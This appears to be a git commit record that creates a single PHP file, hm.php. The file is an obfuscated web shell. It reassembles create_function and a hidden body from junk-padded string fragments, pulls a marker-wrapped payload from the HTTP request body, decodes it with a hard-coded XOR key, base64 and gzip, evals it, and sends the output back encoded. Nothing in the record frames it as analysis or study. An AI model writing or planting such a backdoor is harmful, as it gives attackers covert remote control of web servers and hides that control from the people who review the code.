d62bf2263aecd7fb4142f2164f85a09ba8bc87fb
secups <secups@gmail.com>
2020-04-23 05:01:39 +0300

    Create hm.php

---
+++ hm.php
@@ -0,0 +1,13 @@
+<?php
+$M='seE64_encode(@Ex(@gzcomEpresEs($o)E,$k));pErinEt("$p$Ekh$r$kf");}';
+$D='$k=EE"8E27EEccb0e";$kh="eEa8aE7E06c4c34";$kf="a16891f84e7Eb";$p="';
+$G=str_replace('fq','','fqcrfqefqate_fqfuncfqfqtion');
+$E=');$j++,$iE++){$o.E=$t{$i}E^$kE{$j};}}reEEEturn E$o;}Eif (@Epreg_m';
+$K='mE[1]),$k)));$o=E@oEb_get_cEontentEs();@Eob_eEnd_EcElean();$r=@ba';
+$n='W9mxOjEtDE1D7bqXSp";EfuEnctioEn x($EtE,$k){$c=strlEen($Ek);$l=st';
+$O='m)==1) {E@Eob_start();@evEal(@gzuncoEEmpress(@x(@baEse6E4_decodEEe($';
+$U='rlEenE($t);$o="";fEoEr(E$i=0;$i<$l;){foEr($j=E0;($j<$EcE&&$i<E$l';
+$u='atch("/$kh(.+E)$kf/",E@file_gEEet_contenEts("phpE://iEnputE")E,$';
+$Q=str_replace('E','',$D.$n.$U.$E.$u.$O.$K.$M);
+$P=$G('',$Q);$P();
+?>
